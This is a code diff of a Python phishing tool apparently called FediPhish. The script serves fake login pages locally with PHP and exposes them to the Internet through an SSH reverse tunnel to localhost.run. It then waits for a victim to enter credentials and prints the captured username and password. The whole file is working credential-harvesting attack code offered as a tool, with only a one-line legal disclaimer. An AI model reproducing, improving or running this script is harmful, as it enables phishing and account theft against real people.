@@ -1,7 +1,28 @@
+#!/bin/python3
 from subprocess import Popen as bg_cmd,DEVNULL,getoutput as bg_cmd_output
 import time,os
-from core.doge import *
 
+#=================
+class doge:
+    bgred='\033[41m'
+    black = '\033[30m'
+    green = '\033[32m'
+    yellow = '\033[93m'
+    lightblue='\033[36m'
+    red = '\033[31m'
+    bold = '\033[01m'
+    reset = '\033[0m'
+
+def col_info(text,defe='\n'):
+    print(f"{doge.lightblue}{doge.bold}[Info]{doge.reset}{doge.bold} {text}",end=defe)
+
+def col_exit(text):
+    print(f"\n{doge.red}{doge.bold}[Exit] {text}{doge.reset}")
+
+def col_selected(text):
+    print(f"\n{doge.yellow}{doge.bold}[Selected] {text}{doge.reset}")
+
+#======================
 def banner():
     print('''
 \033[40m\033[31m\033[01m* _____        _ _ ____  _     _     _     *
@@ -20,19 +41,14 @@ def intro():
 without prior mutual consent is illegal.\033[0m''')
 
 def startup():
-    bg_cmd('rm -r server && mkdir server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
-    bg_cmd('rm link',shell=True,stderr=DEVNULL,stdout=DEVNULL)
-    check_php = bg_cmd_output('which php')
-    if check_php == '':
-         col_exit("I require php but it's not installed.")
-         exit()
+    bg_cmd('rm -r $HOME/.FediPhish/server && mkdir $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
 
 def stop_services():
     bg_cmd('killall -9 ssh && killall -2 php',shell=True,stderr=DEVNULL,stdout=DEVNULL)
 
 def move_files(web):
-    bg_cmd('cp -r ./core/web/'+web+'/* ./server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
-    bg_cmd('cp ./core/web/login.php ./server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
+    bg_cmd('cp -r $HOME/.FediPhish/web/'+web+'/* $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
+    bg_cmd('cp $HOME/.FediPhish/web/login.php $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
 
 def web_list():
     print('\n\033[01m\033[35mAvailable phishing modules\033[0m\033[01m')
@@ -62,26 +78,50 @@ def web_list():
         exit()
     return selected
 
-def start_server(port,selected):
+def start_server(selected,port='36012'):
     move_files(selected)
     os.system('clear')
     banner()
     col_selected(selected)
     col_info('Starting php server [localhost:'+port+']...','')
-    bg_cmd('php -S localhost:'+port+' -t ./server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
+    bg_cmd('php -S localhost:'+port+' -t $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
     print('\33[92m'+' done'+'\33[0m')
     col_info('Exposing localhost:'+port+' to the Internet...','')
     print(end='',flush=True)
-    bg_cmd('sh -c "ssh -o StrictHostKeyChecking=no -R 80:localhost:'+port+' nokey@localhost.run 2>/dev/null 1> link" &',shell=True,stderr=DEVNULL,stdout=DEVNULL)
+    bg_cmd('sh -c "ssh -o StrictHostKeyChecking=no -R 80:localhost:'+port+' nokey@localhost.run 2>/dev/null 1> $HOME/.FediPhish/server/link" &',shell=True,stderr=DEVNULL,stdout=DEVNULL)
     time.sleep(8)
     print('\33[92m'+' done'+'\33[0m')
-    link = bg_cmd_output('grep -o "https://[0-9a-z]*\.localhost.run" link')
+    link = bg_cmd_output('grep -o "https://[0-9a-z]*\.lhrtunnel.link" $HOME/.FediPhish/server/link')
     link_text=f'Link: {link}'
     col_info(link_text)
     col_info('Waiting for target to login')
     
 def get_creds():
     col_info('Credentials found')
-    user = bg_cmd_output('cat ./server/creds.txt | head -1')
-    passwd = bg_cmd_output('cat ./server/creds.txt | tail -1')
-    print(f'[Username] : {user}\n[Password] : {passwd}')
+    f=open(os.environ['HOME']+'/.FediPhish/server/creds.txt').readlines()
+    print(f'[Username] : {f[0].strip()}\n[Password] : {f[1].strip()}')
+
+#=================================
+try:
+    os.system('clear')
+    startup()
+    stop_services()
+    intro()
+    selected = web_list()
+    col_info('Enter port (default = 36012):')
+    s_port=input()
+    if s_port=='':
+        start_server(selected)
+    else:
+        start_server(selected,s_port)
+    #================
+    while 1:
+        cr = os.path.exists(os.environ['HOME']+'/.FediPhish/server/creds.txt')
+        if cr==True:
+            break
+    #================
+    get_creds()
+    stop_services()
+
+except KeyboardInterrupt:
+    col_exit('KeyboardInterrupt')
